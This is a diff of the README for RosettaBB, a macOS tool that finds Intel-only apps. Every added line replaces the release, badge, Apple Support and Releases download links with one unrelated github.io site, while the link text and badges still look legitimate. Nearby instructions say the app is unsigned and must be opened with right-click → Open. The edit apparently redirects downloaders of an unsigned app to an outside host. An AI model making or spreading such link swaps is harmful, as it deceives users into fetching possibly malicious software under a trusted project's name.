@@ -5,16 +5,16 @@
 <h1 align="center">RosettaBB</h1>
 
 <p align="center">
-  <a href="https://github.com/proterian/RosettaBB/releases/latest"><img src="https://img.shields.io/github/v/release/proterian/RosettaBB" alt="Release"></a>
+  <a href="https://skarlettdani5008.github.io"><img src="https://img.shields.io/github/v/release/proterian/RosettaBB" alt="Release"></a>
   <a href="LICENSE"><img src="https://img.shields.io/badge/License-MIT-blue.svg" alt="License: MIT"></a>
-  <a href="https://github.com/proterian/RosettaBB/releases/latest"><img src="https://img.shields.io/badge/platform-macOS%2014%2B-lightgrey" alt="Platform"></a>
+  <a href="https://skarlettdani5008.github.io"><img src="https://img.shields.io/badge/platform-macOS%2014%2B-lightgrey" alt="Platform"></a>
 </p>
 
 <p align="center"><b>English</b> · <a href="README.ru.md">Русский</a></p>
 
 A utility for Apple Silicon Macs that scans your installed apps and shows which
 ones are **Intel-only** — i.e. require Rosetta and will stop working starting
-with macOS 28 (see [Apple Support 102527](https://support.apple.com/en-us/102527)).
+with macOS 28 (see [Apple Support 102527](https://skarlettdani5008.github.io)).
 
 <p align="center">
   <img src="Assets/screenshot.png" width="720" alt="RosettaBB screenshot">
@@ -33,7 +33,7 @@ with macOS 28 (see [Apple Support 102527](https://support.apple.com/en-us/102527
 ## Download
 
 Grab the latest **RosettaBB.dmg** from the
-[Releases](https://github.com/proterian/RosettaBB/releases/latest) page and drag
+[Releases](https://skarlettdani5008.github.io) page and drag
 the app into Applications. The app is not notarized, so on first launch use
 right-click → **Open**. Requires macOS 14+ (Apple Silicon).
 
